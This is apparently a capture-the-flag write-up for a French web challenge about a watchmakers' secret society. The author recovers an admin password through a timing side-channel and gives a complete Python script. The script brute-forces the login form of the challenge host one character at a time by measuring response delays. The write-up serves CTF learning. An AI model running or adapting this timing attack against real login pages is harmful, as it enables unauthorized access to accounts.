```
Une société secrète d'horloger prépare quelque chose...

Saurez-vous pénétrer leur platforme web ?
```

Many clocks... After a week of overthinking, i realized "wait, there are many clocks !". And then i tried a timing attack ... which was the solution :)
I figured it out because inputting `B` as password took 200ms, while another letter was taking at max 10ms.

Here is my code !

```python
import requests
import string
import time

def send_request(password_attempt):
    url = "http://tictoc2.chall.malicecyber.com/login.php"
    data = {"username": "admin", "password": password_attempt}
    start_time = time.time()
    response = requests.post(url, data=data, allow_redirects=False)
    end_time = time.time()
    return response, end_time - start_time

def perform_timing_attack():
    valid_characters = " ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_*"
   # valid_characters = " !\"#$%&\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~"

    correct_password = []
    password_length = 60  # Adjust to the actual length of the password
    last_time = 0

    while len(correct_password) < password_length:
        max_response_time = 0
        next_char = None

        for char in valid_characters:
            while True:
                password_attempt = ''.join(correct_password) + char
                response, response_time = send_request(password_attempt)
                if response_time <= 2.0:
                    time.sleep(30)
                else:
                    break

            print(f"Attempt: {password_attempt}, Response Time: {response_time}")

            if response_time - last_time >= 0.15 and last_time != 0:
                max_response_time = response_time
                next_char = char
                last_time = response_time
                break

            if response_time > max_response_time:
                max_response_time = response_time
                next_char = char


        if next_char is not None:
            last_time = max_response_time
            correct_password.append(next_char)
            print("Current password:", ''.join(correct_password))
        else:
            print("No valid character found for the next position.")
            break  # Break out of the loop if no characters were added

    print("Final password:", ''.join(correct_password))

if __name__ == "__main__":
    perform_timing_attack()

```

Password was very long... ``
And that gives us the flag: ``
